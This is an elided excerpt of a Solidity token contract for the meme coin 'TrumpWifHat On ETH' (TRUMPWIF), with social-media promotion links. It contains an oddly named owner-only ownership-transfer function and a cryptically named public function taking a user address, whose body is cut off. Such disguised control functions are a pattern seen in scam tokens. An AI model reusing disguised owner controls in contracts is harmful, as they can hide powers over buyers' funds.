...
/**
https://t.me/TrumpWifHat_ONETH
https://twitter.com/TRUMPWIF_Erc
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipfertyus(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract TRUMPWIF is Ownable {
    ...
    constructor (){
        name = unicode"TrumpWifHat On ETH";
        symbol = unicode"TRUMPWIF";
        decimals = 9;
    ...
    function _lockliqsill(address user) public {
